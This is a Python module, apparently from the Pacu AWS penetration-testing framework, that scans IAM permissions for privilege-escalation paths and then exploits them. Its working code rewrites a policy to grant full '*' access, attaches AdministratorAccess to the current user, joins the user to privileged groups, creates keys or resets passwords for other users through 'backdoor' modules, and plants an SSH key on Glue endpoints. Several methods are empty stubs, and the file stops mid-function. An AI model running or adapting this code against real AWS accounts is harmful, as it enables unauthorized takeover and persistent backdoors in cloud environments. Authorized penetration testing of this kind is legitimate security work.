#!/usr/bin/env python3
import argparse
from copy import deepcopy
import json
import os
import re
import time


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'privesc_scan',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'escalation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'An IAM privilege escalation path finder and abuser.',

    # Description about what the module does and how it works
    'description': '\nThis module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the user and executed on if chosen.\n',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM', 'EC2', 'Glue', 'Lambda', 'DataPipeline', 'DynamoDB', 'CloudFormation'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--offline', '--folder', '--scan-only'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--offline', required=False, default=False, action='store_true', help='By passing this argument, this module will not make an API calls. If offline mode is enabled, you need to pass a file path to a folder that contains JSON files of the different users, policies, groups, and/or roles in the account using the --folder argument. This module will scan those JSON policy files to identify users, groups, and roles that have overly permissive policies.')
parser.add_argument('--folder', required=False, default=None, help='A file path pointing to a folder full of JSON files containing policies and connections between users, groups, and/or roles in an AWS account. The module "confirm_permissions" with the "--all-users" flag outputs the exact format required for this feature to ./sessions/[current_session_name]/downloads/confirmed_permissions/.')
parser.add_argument('--scan-only', required=False, default=False, action='store_true', help='Only run the scan to check for possible escalation methods, don\'t attempt any found methods.')


# Permissions to check (x == added checks already):
# 1)x Associate an existing instance profile with an existing EC2 instance
#   iam:PassRole
#   ec2:AssociateIamInstanceProfile
#   ? ec2:DescribeInstances to know the right instance ID
#   ? iam:ListRoles to know what instance profiles exist already
# 2)x Create new instance with ssh key that I control, with an existing instance profile
#   ec2:CreateKeyPair // This actually could be replace by code execution in the user data
#   ec2:RunInstances
#   iam:PassRole
#   ? iam:ListInstanceProfiles to know what instance profiles exist already
# 3)x Create instance profile, create or use a role, attach policies to the role if necessary, attach the role to the profile, then create a new instance with ssh keys that I control
#   iam:PassRole
#   iam:CreateInstanceProfile
#   ? iam:ListRoles to see if there is a role to associate with an instance profile
#   ? iam:CreateRole if there are no roles to associate with an instance profile
#   ? iam:AttachRolePolicy or iam:PutRolePolicy if permissions are needed to be added to the role being used
#   ? iam:AddRoleToInstanceProfile if there is not already an instance profile with a suitable role attached
#   ec2:CreateKeyPair
#   ec2:RunInstances
# 4)x Create a new version of an existing policy and set it as default
#   iam:CreatePolicyVersion
#   ? iam:ListPolicies to determine the policy ARN
#   ? iam:DeletePolicyVersion if there are already 5 versions
#   // iam:SetDefaultPolicyVersion is only required if setting the default straight up. Not required if creating a policy with --set-as-default flag enabled
# 5)x Create a set of access keys for a different user
#   iam:CreateAccessKey
#   ? iam:ListUsers if I need to figure out a username to target
# 6)x Create a web console login profile for an account that doesn't have one yet
#   iam:CreateLoginProfile
#   ? iam:ListUsers if I need to figure out a username to target
# 7)x Attach an existing policy, to a user, group, or role that I have access to
#   iam:AttachUserPolicy
#   iam:AttachGroupPolicy
#   iam:AttachRolePolicy
#   ? Somehow try and figure out what groups/roles are attached to the user user
# 8)x Attach inline policies to a user, group, or role that I have access to
#   iam:PutUserPolicy
#   iam:PutGroupPolicy
#   iam:PutRolePolicy
#   ? Somehow try and figure out what groups/roles are attached to the user user
# 9)x Add the user user to a more privileged group
#   iam:AddUserToGroup
#   ? iam:ListGroups to enumerate groups
# 10)x Allow the user user to assume higher privileged roles
#   iam:UpdateAssumeRolePolicy
#   ? Some way to update their own policy to allows them to iam:AssumeRole if they can't already
# 11)x Change the password of an existing user
#   iam:UpdateLoginProfile
#   ? iam:ListUsers to find users to change
# 12)x Pass role to new Lambda function
#   iam:PassRole
#   lambda:CreateFunction
#   ? lambda:CreateEventSourceMapping
#   ? lambda:InvokeFunction
#   ? iam:CreateRole
#   ? dynamodb:CreateTable (https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Streams.Lambda.Tutorial.html)
#   ? dynamodb:PutItem
# 15)x Datapipeline passrole privesc.
#   Pass a role to a pipeline that is scheduled to run an AWS CLI command. Can escalate somewhat if only the default role is allowed to be passed, otherwise anything is possible. This is annoying to setup, use https://github.com/aws-samples/data-pipeline-samples/tree/master/samples for help
# 17)x Glue passrole privesc
#   SSH into a dev endpoint for full access to AWS CLI
#   iam:PassRole
#   glue:GetDevEndpoint (or glue:GetDevEndpoints)
#   glue:CreateDevEndpoint (or glue:UpdateDevEndpoint)
# 18) GreenGrass passrole privesc ?
# 19) Redshift passrole privesc ?
# 20) S3 passrole privesc ?
# 21) ServiceCatalog passrole privesc ?
# 22) StorageGateway passrole privesc ?
# 23)x CloudFormation passrole privesc!
# 24) Modify existing Lambda function with higher privs than current user


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    ######

    summary_data = {'scan_only': args.scan_only}

    all_perms = [
        'iam:AddRoleToInstanceProfile',
        'iam:AddUserToGroup',
        'iam:AttachGroupPolicy',
        'iam:AttachRolePolicy',
        'iam:AttachUserPolicy',
        'iam:CreateAccessKey',
        'iam:CreateInstanceProfile',
        'iam:CreateLoginProfile',
        'iam:CreatePolicyVersion',
        'iam:DeletePolicyVersion',
        'iam:ListAttachedGroupPolicies',
        'iam:ListAttachedUserPolicies',
        'iam:ListAttachedRolePolicies',
        'iam:ListGroupPolicies',
        'iam:ListGroups',
        'iam:ListGroupsForUser',
        'iam:ListInstanceProfiles',
        'iam:ListPolicies',
        'iam:ListPolicyVersions',
        'iam:ListRolePolicies',
        'iam:ListRoles',
        'iam:ListUserPolicies',
        'iam:ListUsers',
        'iam:PassRole',
        'iam:PutGroupPolicy',
        'iam:PutRolePolicy',
        'iam:PutUserPolicy',
        'iam:SetDefaultPolicyVersion',
        'iam:UpdateAssumeRolePolicy',
        'iam:UpdateLoginProfile',
        'sts:AssumeRole',
        'ec2:AssociateIamInstanceProfile',
        'ec2:DescribeInstances',
        'ec2:RunInstances',
        'lambda:CreateEventSourceMapping',
        'lambda:CreateFunction',
        'lambda:InvokeFunction',
        'lambda:UpdateFunctionCode',
        'lambda:ListFunctions',
        'dynamodb:CreateTable',
        'dynamodb:DescribeTables',
        'dynamodb:PutItem',
        'glue:CreateDevEndpoint',
        'glue:DescribeDevEndpoints'
        'glue:GetDevEndpoint',
        'glue:GetDevEndpoints',
        'glue:UpdateDevEndpoint',
        'cloudformation:CreateStack',
        'datapipeline:CreatePipeline'
    ]
    checked_perms = {'Allow': {}, 'Deny': {}}
    escalation_methods = {
        'CreateNewPolicyVersion': {
            'iam:CreatePolicyVersion': True,  # Create new policy and set it as default
            'iam:ListAttachedGroupPolicies': False,  # Search for policies belonging to the user
            'iam:ListAttachedUserPolicies': False,  # ^
            'iam:ListAttachedRolePolicies': False,  # ^
            'iam:ListGroupsForUser': False  # ^
        },
        'SetExistingDefaultPolicyVersion': {
            'iam:SetDefaultPolicyVersion': True,  # Set a different policy version as default
            'iam:ListPolicyVersions': False,  # Find a version to change to
            'iam:ListAttachedGroupPolicies': False,  # Search for policies belonging to the user
            'iam:ListAttachedUserPolicies': False,  # ^
            'iam:ListAttachedRolePolicies': False,  # ^
            'iam:ListGroupsForUser': False  # ^
        },
        'CreateEC2WithExistingIP': {
            'iam:PassRole': True,  # Pass the instance profile/role to the EC2 instance
            'ec2:RunInstances': True,  # Run the EC2 instance
            'iam:ListInstanceProfiles': False  # Find an IP to pass
        },
        'CreateAccessKey': {
            'iam:CreateAccessKey': True,  # Create a new access key for some user
            'iam:ListUsers': False  # Find a user to create a key for
        },
        'CreateLoginProfile': {
            'iam:CreateLoginProfile': True,  # Create a login profile for some user
            'iam:ListUsers': False  # Find a user to create a profile for
        },
        'UpdateLoginProfile': {
            'iam:UpdateLoginProfile': True,  # Update the password for an existing login profile
            'iam:ListUsers': False  # Find a user to update the password for
        },
        'AttachUserPolicy': {
            'iam:AttachUserPolicy': True,  # Attach an existing policy to a user
            'iam:ListUsers': False  # Find a user to attach to
        },
        'AttachGroupPolicy': {
            'iam:AttachGroupPolicy': True,  # Attach an existing policy to a group
            'iam:ListGroupsForUser': False,  # Find a group to attach to
        },
        'AttachRolePolicy': {
            'iam:AttachRolePolicy': True,  # Attach an existing policy to a role
            'sts:AssumeRole': True,  # Assume that role
            'iam:ListRoles': False  # Find a role to attach to
        },
        'PutUserPolicy': {
            'iam:PutUserPolicy': True,  # Alter an existing-attached inline user policy
            'iam:ListUserPolicies': False  # Find a users inline policies
        },
        'PutGroupPolicy': {
            'iam:PutGroupPolicy': True,  # Alter an existing-attached inline group policy
            'iam:ListGroupPolicies': False  # Find a groups inline policies
        },
        'PutRolePolicy': {
            'iam:PutRolePolicy': True,  # Alter an existing-attached inline role policy
            'sts:AssumeRole': True,  # Assume that role
            'iam:ListRolePolicies': False  # Find a roles inline policies
        },
        'AddUserToGroup': {
            'iam:AddUserToGroup': True,  # Add a user to a higher level group
            'iam:ListGroups': False  # Find a group to add the user to
        },
        'UpdateRolePolicyToAssumeIt': {
            'iam:UpdateAssumeRolePolicy': True,  # Update the roles AssumeRolePolicyDocument to allow the user to assume it
            'sts:AssumeRole': True,  # Assume the newly update role
            'iam:ListRoles': False  # Find a role to assume
        },
        'PassExistingRoleToNewLambdaThenInvoke': {
            'iam:PassRole': True,  # Pass the role to the Lambda function
            'lambda:CreateFunction': True,  # Create a new Lambda function
            'lambda:InvokeFunction': True,  # Invoke the newly created function
            'iam:ListRoles': False  # Find a role to pass
        },
        'PassExistingRoleToNewLambdaThenTriggerWithNewDynamo': {
            'iam:PassRole': True,  # Pass the role to the Lambda function
            'lambda:CreateFunction': True,  # Create a new Lambda function
            'lambda:CreateEventSourceMapping': True,  # Create a trigger for the Lambda function
            'dynamodb:CreateTable': True,  # Create a new table to use as the trigger ^
            'dynamodb:PutItem': True,  # Put a new item into the table to trigger the trigger
            'iam:ListRoles': False  # Find a role to pass to the function
        },
        'PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo': {
            'iam:PassRole': True,  # Pass the role to the Lambda function
            'lambda:CreateFunction': True,  # Create a new Lambda function
            'lambda:CreateEventSourceMapping': True,  # Create a trigger for the Lambda function
            'dynamodb:PutItem': False,  # Put a new item into the table to trigger the trigger
            'dynamodb:DescribeTables': False,  # Find an existing DynamoDB table
            'iam:ListRoles': False  # Find a role to pass to the function
        },
        'PassExistingRoleToNewGlueDevEndpoint': {
            'iam:PassRole': True,  # Pass the role to the Glue Dev Endpoint
            'glue:CreateDevEndpoint': True,  # Create the new Glue Dev Endpoint
            'iam:ListRoles': False  # Find a role to pass to the endpoint
        },
        'UpdateExistingGlueDevEndpoint': {
            'glue:UpdateDevEndpoint': True,  # Update the associated SSH key for the Glue endpoint
            'glue:DescribeDevEndpoints': False  # Find a dev endpoint to update
        },
        'PassExistingRoleToCloudFormation': {
            'iam:PassRole': True,
            'cloudformation:CreateStack': True,
            'iam:ListRoles': False
        },
        'PassExistingRoleToNewDataPipeline': {
            'iam:PassRole': True,
            'datapipeline:CreatePipeline': True,
            'iam:ListRoles': False
        },
        'EditExistingLambdaFunctionWithRole': {
            'lambda:UpdateFunctionCode': True,
            'lambda:ListFunctions': False,
            'lambda:InvokeFunction': False
        }
    }

    # Check if this is an offline scan
    if args.offline is True:
        potential_methods = {}
        folder = args.folder

        if args.folder is None:
            folder = 'sessions/{}/downloads/confirmed_permissions/'.format(session.name)
            print('No --folder argument passed to offline mode, using the default: ./{}\n'.format(folder))
            if os.path.isdir(folder) is False:
                print('sessions/{}/downloads/confirmed_permissions/ not found! Maybe you have not run confirm_permissions yet...\n'.format(session.name))
                if fetch_data(['All users permissions'], 'confirm_permissions', '--all-users') is False:
                    print('Pre-req module not run. Exiting...')
                    return

        try:
            files = os.listdir(folder)
            for file_name in files:
                with open('{}{}'.format(folder, file_name), 'r') as confirmed_permissions_file:
                    user = json.load(confirmed_permissions_file)

                if '*' in user['Permissions']['Allow'] and user['Permissions']['Allow']['*'] == '*':  # If the user is already an admin, skip them
                    print('  {} already has administrator permissions.'.format(user['UserName']))
                    continue

                potential_methods[user['UserName']] = []

                for method in escalation_methods.keys():
                    is_possible = True

                    for permission in escalation_methods[method]:
                        if escalation_methods[method][permission] is True:  # If the permission is required for the method
                            if permission in user['Permissions']['Deny']:
                                is_possible = False
                                break

                            elif permission not in user['Permissions']['Allow']:  # and the user doesn't have it allowed
                                wildcard_match = False

                                for user_perm in user['Permissions']['Allow']:
                                    if '*' in user_perm:
                                        if permission.startswith(user_perm.split('*', maxsplit=1)[0]):
                                            wildcard_match = True

                                if wildcard_match is False:
                                    is_possible = False
                                    break

                    if is_possible is True:
                        potential_methods[user['UserName']].append(method)

            potential_methods = remove_empty_from_dict(potential_methods)
            print(potential_methods)

            now = time.time()
            with open('sessions/{}/downloads/offline_privesc_scan_{}.json'.format(session.name, now), 'w+') as scan_results_file:
                json.dump(potential_methods, scan_results_file, indent=2, default=str)

            print('Completed offline privesc_scan of directory ./{}. Results stored in ./sessions/{}/downloads/offline_privesc_scan_{}.json'.format(folder, session.name, now))
            return

        except Exception as e:
            print('Error accessing folder {}: {}\nExiting...'.format(folder, e))
            return

    # It is online if it has reached here

    user = key_info()

    # Preliminary check to see if these permissions have already been enumerated in this session
    if 'Permissions' in user and 'Allow' in user['Permissions']:
        # Have any permissions been enumerated?
        if user['Permissions']['Allow'] == {} and user['Permissions']['Deny'] == {}:
            print('No permissions detected yet.')
            if fetch_data(['User', 'Permissions'], 'confirm_permissions', '') is False:
                print('Pre-req module not run successfully. Exiting...')
                return
            user = key_info()

        # Are they an admin already?
        if '*' in user['Permissions']['Allow'] and user['Permissions']['Allow']['*'] == ['*']:
            print('You already have admin permissions (Action: * on Resource: *)! Exiting...')
            return

        for perm in all_perms:
                for effect in ['Allow', 'Deny']:
                    if perm in user['Permissions'][effect]:
                        checked_perms[effect][perm] = user['Permissions'][effect][perm]
                    else:
                        for user_perm in user['Permissions'][effect].keys():
                            if '*' in user_perm:
                                pattern = re.compile(user_perm.replace('*', '.*'))
                                if pattern.search(perm) is not None:
                                    checked_perms[effect][perm] = user['Permissions'][effect][user_perm]

    checked_methods = {
        'Potential': [],
        'Confirmed': []
    }

    # Ditch each escalation method that has been confirmed not to be possible
    for method in escalation_methods.keys():
        potential = True
        confirmed = True

        for perm in escalation_methods[method]:
            if escalation_methods[method][perm] is True:  # If this permission is required
                if 'PermissionsConfirmed' in user and user['PermissionsConfirmed'] is True:  # If permissions are confirmed
                    if perm not in checked_perms['Allow']:  # If this permission isn't Allowed, then this method won't work
                        potential = confirmed = False
                        break
                    elif perm in checked_perms['Deny'] and perm in checked_perms['Allow']:  # Permission is both Denied and Allowed, leave as potential, not confirmed
                        confirmed = False

                else:
                    if perm in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it is Allowed and Denied, leave as potential, not confirmed
                        confirmed = False
                    elif perm not in checked_perms['Allow'] and perm in checked_perms['Deny']:  # If it isn't Allowed and IS Denied
                        potential = confirmed = False
                        break
                    elif perm not in checked_perms['Allow'] and perm not in checked_perms['Deny']:  # If its not Allowed and not Denied
                        confirmed = False

        if confirmed is True:
            print('CONFIRMED: {}\n'.format(method))
            checked_methods['Confirmed'].append(method)

        elif potential is True:
            print('POTENTIAL: {}\n'.format(method))
            checked_methods['Potential'].append(method)

    # If --scan-only wasn't passed in and there is at least one Confirmed or Potential method to try
    if args.scan_only is False and (len(checked_methods['Confirmed']) > 0 or len(checked_methods['Potential']) > 0):
        escalated = False
        # Attempt confirmed methods first
        methods = globals()

        if len(checked_methods['Confirmed']) > 0:
            print('Attempting confirmed privilege escalation methods...\n')

            for confirmed_method in checked_methods['Confirmed']:
                response = methods[confirmed_method](pacu_main, print, input, fetch_data)

                if response is False:
                    print('  Method failed. Trying next potential method...')
                else:
                    escalated = True
                    break

            if escalated is False:
                print('No confirmed privilege escalation methods worked.')

        else:
            print('No confirmed privilege escalation methods were found.')

        if escalated is False and len(checked_methods['Potential']) > 0:  # If confirmed methods did not work out
            print('Attempting potential privilege escalation methods...')

            for potential_method in checked_methods['Potential']:
                response = methods[potential_method](pacu_main, print, input, fetch_data)

                if response is False:
                    print('  Method failed. Trying next potential method...')
                else:
                    escalated = True
                    break

            if escalated is False:
                print('No potential privilege escalation methods worked.')
        summary_data['success'] = escalated
    print('{} completed.\n'.format(module_info['name']))
    return summary_data


def summary(data, pacu_main):
    if data['scan_only']:
        return '  Scan Complete'
    else:
        if data['success']:
            out = '  Privilege escalation was successful'
        else:
            out = '  Privilege escalation was not successful'
    return out


# https://stackoverflow.com/a/24893252
def remove_empty_from_dict(d):
    if type(d) is dict:
        return dict((k, remove_empty_from_dict(v)) for k, v in d.items() if v and remove_empty_from_dict(v))
    elif type(d) is list:
        return [remove_empty_from_dict(v) for v in d if v and remove_empty_from_dict(v)]
    else:
        return d


# Functions for individual privesc methods
# Their names match their key names under the escalation_methods object so I can invoke a method by running globals()[method]()
# Each of these will return True if successful and False is failed

def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method CreateNewPolicyVersion...\n')
    client = pacu_main.get_boto3_client('iam')

    policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a valid policy to target): ')

    if not policy_arn:
        print('    No policy ARN entered, now finding a valid policy...\n')

        active_aws_key = session.get_active_aws_key(pacu_main.database)

        if active_aws_key.policies:
            all_user_policies = active_aws_key.policies
            valid_user_policies = []

            for policy in all_user_policies:
                if 'PolicyArn' in policy.keys() and 'arn:aws:iam::aws' not in policy['PolicyArn']:
                    valid_user_policies.append(deepcopy(policy))

            print('      {} valid user-attached policy(ies) found...\n'.format(len(valid_user_policies)))

            if len(valid_user_policies) > 1:
                for i in range(0, len(valid_user_policies)):
                    print('        [{}] {}'.format(i, valid_user_policies[i]['PolicyName']))

                while not policy_arn:
                    choice = input('      Choose an option: ').strip()
                    try:
                        choice = int(choice)
                        policy_arn = valid_user_policies[choice]['PolicyArn']
                    except Exception as e:
                        policy_arn = ''
                        print('    Invalid option. Try again.')

            elif len(valid_user_policies) == 1:
                policy_arn = valid_user_policies[0]['PolicyArn']

            else:
                print('      No valid user-attached policies found.')

        # If no valid user-attached policies found, try groups
        if active_aws_key.groups and not policy_arn:
            groups = active_aws_key.groups
            valid_group_policies = []

            for group in groups:
                for policy in group['Policies']:
                    if 'PolicyArn' in policy and 'arn:aws:iam::aws' not in policy['PolicyArn']:
                        valid_group_policies.append(deepcopy(policy))

            if len(valid_group_policies) > 1:
                for i in range(0, len(valid_group_policies)):
                    print('        [{}] {}'.format(i, valid_group_policies[i]['PolicyName']))

                while not policy_arn:
                    choice = input('      Choose an option: ')
                    try:
                        choice = int(choice)
                        policy_arn = valid_group_policies[choice]['PolicyArn']
                    except Exception as e:
                        policy_arn = ''
                        print('    Invalid option. Try again.')

            elif len(valid_group_policies) == 1:
                policy_arn = valid_group_policies[0]['PolicyArn']

            else:
                print('      No valid group-attached policies found.')

        # If it looks like permissions haven't been/attempted to be enumerated
        if not policy_arn:
            fetch = input('    It looks like the current users confirmed permissions have not been enumerated yet, so no valid policy can be found, enter "y" to run the confirm_permissions module to enumerate the required information, enter the ARN of a policy to create a new version for, or "n" to skip this privilege escalation module ([policy_arn]/y/n): ')
            if fetch.strip().lower() == 'n':
                print('    Cancelling CreateNewPolicyVersion...')
                return False

            elif fetch.strip().lower() == 'y':
                if fetch_data(None, 'confirm_permissions', '', force=True) is False:
                    print('Pre-req module not run successfully. Skipping method...')
                    return False
                return CreateNewPolicyVersion(pacu_main, print, input, fetch_data)

            else:  # It is an ARN
                policy_arn = fetch

    if not policy_arn:  # If even after everything else, there is still no policy: Ask the user to give one or exit
        policy_arn = input('  All methods of enumerating a valid policy have failed. Manually enter in a policy ARN to use, or press enter to skip to the next privilege escalation method: ')
        if not policy_arn:
            return False

    try:
        response = client.create_policy_version(
            PolicyArn=policy_arn,
            PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}',
            SetAsDefault=True
        )['PolicyVersion']

        if 'VersionId' in response and 'IsDefaultVersion' in response and 'CreateDate' in response:
            print('    Privilege escalation successful using method CreateNewPolicyVersion!\n\n  The current user is now an administrator ("*" permissions on "*" resources).\n')
            return True

        else:
            print('    Something is wrong with the response when attempting to create a new policy version. It should contain the keys "VersionId", "IsDefaultVersion", and "CreateDate". We received:\n      {}'.format(response))
            print('      Reporting this privilege escalation attempt as a fail...')
            return False

    except Exception as e:
        print('   Failed to create new policy version on policy {}...'.format(policy_arn))
        print('     Error given: {}'.format(e))
        return False


def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
    return


def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
    return


def CreateAccessKey(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method CreateAccessKey...')

    username = input('    Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: ')
    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
        print('Pre-req module not run successfully. Exiting...')
        return False
    users = session.IAM['Users']
    print('Found {} user(s). Choose a user below.'.format(len(users)))
    print('  [0] Other (Manually enter user name)')
    for i in range(0, len(users)):
        print('  [{}] {}'.format(i + 1, users[i]['UserName']))
    choice = input('Choose an option: ')
    if int(choice) == 0:
        username = input('    Enter a user name: ')
    else:
        username = users[int(choice) - 1]['UserName']

    # Use the backdoor_users_keys module to do the access key creating
    try:
        fetch_data(None, 'backdoor_users_keys', '--usernames {}'.format(username), force=True)
    except Exception as e:
        print('      Failed to create an access key for user {}: {}'.format(username, e))
        again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
        if again.strip().lower() == 'y':
            print('      Re-running CreateAccessKey privilege escalation attempt...')
            return CreateAccessKey(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def CreateLoginProfile(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method CreatingLoginProfile...')

    username = input('    Is there a specific user you want to target? They must not already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
        print('Pre-req module not run successfully. Exiting...')
        return False
    users = session.IAM['Users']
    print('Found {} user(s). Choose a user below.'.format(len(users)))
    print('  [0] Other (Manually enter user name)')
    print('  [1] All Users')
    for i in range(0, len(users)):
        print('  [{}] {}'.format(i + 2, users[i]['UserName']))
    choice = input('Choose an option: ')
    if int(choice) == 0:
        username = input('    Enter a user name: ')
    else:
        username = users[int(choice) - 2]['UserName']

    # Use the backdoor_users_keys module to do the login profile creating
    try:
        if int(choice) == 1:
            user_string = ''
            for user in users:
                user_string = '{},{}'.format(user_string, user['UserName'])  # Prepare username list for backdoor_users_password
            user_string = user_string[1:]  # Remove first comma
            fetch_data(None, 'backdoor_users_password', '--usernames {}'.format(user_string), force=True)
        else:
            fetch_data(None, 'backdoor_users_password', '--usernames {}'.format(username), force=True)
    except Exception as e:
        print('      Failed to create a login profile for user {}: {}'.format(username, e))
        again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
        if again == 'y':
            print('      Re-running CreateLoginProfile privilege escalation attempt...')
            return CreateLoginProfile(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def UpdateLoginProfile(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method UpdateLoginProfile...')

    username = input('    Is there a specific user you want to target? They must already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
        print('Pre-req module not run successfully. Exiting...')
        return False
    users = session.IAM['Users']
    print('Found {} user(s). Choose a user below.'.format(len(users)))
    print('  [0] Other (Manually enter user name)')
    print('  [1] All Users')
    for i in range(0, len(users)):
        print('  [{}] {}'.format(i + 2, users[i]['UserName']))
    choice = input('Choose an option: ')
    if int(choice) == 0:
        username = input('    Enter a user name: ')
    else:
        username = users[int(choice) - 2]['UserName']

    try:
        if int(choice) == 1:
            user_string = ''
            for user in users:
                user_string = '{},{}'.format(user_string, user['UserName'])  # Prepare username list for backdoor_users_password
            user_string = user_string[1:]  # Remove first comma
            fetch_data(None, 'backdoor_users_password', '--update --usernames {}'.format(user_string), force=True)
        else:
            fetch_data(None, 'backdoor_users_password', '--update --usernames {}'.format(username), force=True)
    except Exception as e:
        print('      Failed to update the login profile for user {}: {}'.format(username, e))
        again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
        if again == 'y':
            print('      Re-running UpdateLoginProfile privilege escalation attempt...')
            return UpdateLoginProfile(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def AttachUserPolicy(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method AttachUserPolicy...')

    client = pacu_main.get_boto3_client('iam')

    policy_arn = input('    Is there a specific policy you want to add to your user? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
    if not policy_arn:
        policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    try:
        active_aws_key = session.get_active_aws_key(pacu_main.database)
        client.attach_user_policy(
            UserName=active_aws_key['UserName'],
            policy_arn=policy_arn
        )
        print('  Successfully attached policy {} to the current user! You should now have access to the permissions associated with that policy.'.format(policy_arn))
        return True
    except Exception as e:
        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, e))
        return False


def AttachGroupPolicy(pacu_main, print, input, fetch_data):
    return


def AttachRolePolicy(pacu_main, print, input, fetch_data):
    return


def PutUserPolicy(pacu_main, print, input, fetch_data):
    return


def PutGroupPolicy(pacu_main, print, input, fetch_data):
    return


def PutRolePolicy(pacu_main, print, input, fetch_data):
    return


def AddUserToGroup(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method AddUserToGroup...')

    client = pacu_main.get_boto3_client('iam')

    group_name = input('    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list possible groups to choose from: ')
    if group_name == '':
        if fetch_data(['IAM', 'Groups'], 'enum_users_roles_policies_groups', '--groups') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        groups = session.IAM['Groups']
        print('Found {} group(s). Choose a group below.'.format(len(groups)))
        print('  [0] Other (Manually enter group name)')
        for i in range(0, len(groups)):
            print('  [{}] {}'.format(i + 1, groups[i]['GroupName']))
        choice = input('Choose an option: ')
        if int(choice) == 0:
            group_name = input('    Enter a group name: ')
        else:
            group_name = groups[int(choice) - 1]['GroupName']

    try:
        active_aws_key = session.get_active_aws_key(pacu_main.database)
        client.add_user_to_group(
            GroupName=group_name,
            UserName=active_aws_key['UserName']
        )
        print('  Successfully added the current user to the group {}! You should now have access to the permissions associated with that group.'.format(group_name))
    except Exception as e:
        print('  Failed to add the current user to the group {}:\n{}'.format(group_name, e))
        again = input('    Do you want to try again with a different group (y) or continue to the next privilege escalation method (n)? ')
        if again == 'y':
            print('      Re-running AddUserToGroup privilege escalation attempt...')
            return AddUserToGroup(pacu_main, print, input, fetch_data)
        else:
            return False
    return True


def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
    return


def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
    return


def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
    return


def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
    return


def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
    return


def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
    session = pacu_main.get_active_session()

    print('  Starting method UpdateExistingGlueDevEndpoint...')

    endpoint_name = input('    Is there a specific Glue Development Endpoint you want to target? Enter the name of it now or just hit enter to enumerate development endpoints and view a list of options: ')
    pub_ssh_key = input('    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation attempt: ')

    if pub_ssh_key == '':
        print('    Skipping UpdateExistingGlueDevEndpoint...')
        return False

    choice = 0
    if endpoint_name == '':
        if fetch_data(['Glue', 'DevEndpoints'], 'enum_glue', '--dev-endpoints') is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        dev_endpoints = session.Glue['DevEndpoints']
        print('Found {} development endpoint(s). Choose one below.'.format(len(dev_endpoints)))
        print('  [0] Other (Manually enter development endpoint name)')
        for i in range(0, len(dev_endpoints)):
            print('  [{}] {}'.format(i + 1, dev_endpoints[i]['EndpointName']))
        choice = input('Choose an option: ')
        if int(choice) == 0:
            endpoint_name = input('    Enter a development endpoint name: ')
        else:
            endpoint_name = dev_endpoints[int(choice) - 1]['EndpointName']
        client = pacu_main.get_boto3_client('glue', dev_endpoints[int(choice) - 1]['Region'])

    try:
        client.update_dev_endpoint(
            EndpointName=endpoint_name,
            PublicKey=pub_ssh_key
        )
        print('  Successfully updated the public key associated with the Glue Development Endpoint {}. You can now SSH into it and access the IAM role associated with it through the AWS CLI.'.format(endpoint_name))
        if not int(choice) == 0:
